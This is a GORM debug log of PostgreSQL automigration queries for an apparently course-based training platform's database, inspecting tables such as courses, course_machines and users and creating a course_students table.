2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.503ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.253ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.612ms] [34;1m[rows:-][0m SELECT * FROM "difficulty_levels" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.911ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.359ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.492ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'difficulty_levels'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.736ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.078ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.145ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.133ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.086ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'level') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.827ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'difficulty_levels' AND indexname = 'idx_difficulty_levels_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.618ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.395ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.213ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.644ms] [34;1m[rows:-][0m SELECT * FROM "course_machines" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.326ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[23.786ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.871ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'course_machines'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.947ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.289ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.110ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.352ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.104ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.109ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.506ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'point') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.058ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'difficulty_level_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.944ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND constraint_name = 'fk_course_machines_difficulty_level'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.965ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'course_machines' AND indexname = 'idx_course_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.781ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.088ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.221ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'courses'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.972ms] [34;1m[rows:-][0m SELECT * FROM "courses" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[60.438ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'courses' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[39.349ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'courses'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.603ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'courses'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.345ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.007ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.748ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.663ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.150ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'content') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.089ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'room_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.739ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'course_machine_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.414ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND constraint_name = 'fk_courses_room'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.759ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND constraint_name = 'fk_courses_course_machine'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.817ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'courses' AND indexname = 'idx_courses_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.145ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[65.082ms] [34;1m[rows:0][0m CREATE TABLE "course_students" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"done" boolean NOT NULL DEFAULT false,"student_id" bigint,"course_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_course_students_student" FOREIGN KEY ("student_id") REFERENCES "students"("id"),CONSTRAINT "fk_course_students_course" FOREIGN KEY ("course_id") REFERENCES "courses"("id"))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.297ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_course_students_deleted_at" ON "course_students" ("deleted_at")

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.204ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.736ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.386ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.698ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[73.243ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[35.898ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.807ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.295ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.307ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.696ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

